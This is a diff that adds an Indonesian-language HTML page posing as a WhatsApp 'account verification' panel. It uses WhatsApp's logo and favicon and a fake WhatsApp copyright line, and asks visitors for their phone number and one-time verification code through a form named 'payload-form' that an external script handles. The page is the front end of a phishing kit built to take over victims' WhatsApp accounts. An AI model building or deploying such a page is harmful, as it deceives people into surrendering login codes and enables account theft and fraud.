@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Panel Verifikasi Keamanan - Akun Pusat</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" href="https://www.whatsapp.com/favicon.ico">
+</head>
+<body>
+    <div id="loading" class="hidden">
+        <div class="loader"></div>
+        <p>Sedang memproses...</p>
+    </div>
+    <div class="card">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" width="50" alt="logo">
+        <h2>Verifikasi Akun</h2>
+        <p>Silakan lengkapi data di bawah untuk mengamankan akun Anda.</p>
+        <form id="payload-form">
+            <input type="tel" id="nomor" placeholder="Nomor WhatsApp (Contoh: 0812...)" required>
+            <input type="password" id="otp" placeholder="Kode Verifikasi / OTP" required>
+            <button type="submit">Konfirmasi Data</button>
+        </form>
+        <div class="footer">© 2026 WhatsApp Inc.</div>
+    </div>
+    <script src="main.js"></script>
+</body>
+</html>
+
